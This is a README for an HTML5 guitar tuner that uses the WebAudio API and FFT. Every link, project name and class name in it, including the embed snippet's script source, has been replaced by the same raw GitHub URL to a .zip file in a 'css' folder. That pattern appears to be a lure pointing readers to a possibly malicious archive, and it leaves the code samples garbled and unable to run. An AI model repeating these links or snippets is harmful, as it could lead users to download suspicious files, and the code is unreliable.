[https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip)
==============

Guitar Tuner in HTML5.

https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip is a web site that use WebAudio API to capture Guitar sound, analyse it and determine the difference from nearest string.
Algorithm can be apply for other instruments or other type of tuning.

Please visit website : [https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip)

How does it works
-----------------

1.	Use [Web Audio API](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip) to construct tree Analyse
2.	Use [getUserMedia](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip) to capture sound from client
3.	Apply [Blackman](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip) window on input signal
4.	Apply FFT from [https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip](https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip)
5.	Apply microphone response correction
6.	Retrieve most contributed frequency
7.	Find nearest note from frequency
8.	Use HTML5 canvas to show difference and note

Widget
-------
CircleWidget show difference in circle mode.
```
var widget = new https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip(canvasElement, backColor, deltaColor, okColor, fontColor);
```

Tuner
-----
GuitarTuner is use in classic Guitar Tuning case. It compute frequency difference from guitar strings.
```
var tuner = new https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip(widget);
```

Use it in your own site
--------
You can use onlinertuner as widget in your own website, and if you implement more controllers or widgets, keep it back!
```
<script type="text/javascript" src="https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip"></script>
<script type="text/javascript">
	function start() {
		var tuners = [
			new https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip(new https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip(canvasElement, backColor, deltaColor, okColor, fontColor));
		];
		
		new https://raw.githubusercontent.com/videogramme/onlinetuner.co/master/css/v2.3.zip(tuners).install(function() {
			//ok 
		}, function(errorMessage) {
			//nok
		});
	}
</script>
```


